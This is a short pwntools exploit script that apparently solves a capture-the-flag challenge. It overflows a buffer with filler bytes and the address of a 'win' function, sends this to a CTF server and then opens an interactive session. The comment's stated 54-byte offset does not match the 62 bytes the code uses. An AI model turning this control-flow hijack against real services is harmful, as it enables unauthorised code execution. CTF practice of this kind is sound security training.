from pwn import *

EXE = ELF("./challenge/chall_2")
breakpoints = [
]
context.binary = EXE
context.terminal = ['xterm', '-e']
context.log_level = "DEBUG"

win_address = EXE.symbols['win']

def conn(useExe=False):
	if useExe:
		# r = gdb.debug(EXE.path, "\n".join(breakpoints))
		r = process([EXE.path])
	else:
		r = remote('pwn.osucyber.club',13372)
	return r

r = conn(False)
# Wait for the process to send "Goodbye, Mr. Anderson..." and respond to move onto vuln()
r.recvline()
r.send(b'a\n')

# Create a package with an offset of 54 bytes then the address win(), send it, and open an interactive terminal
package = b'a'*62
package += p32(win_address)+b'\n'
r.send(package)
r.interactive()

r.close()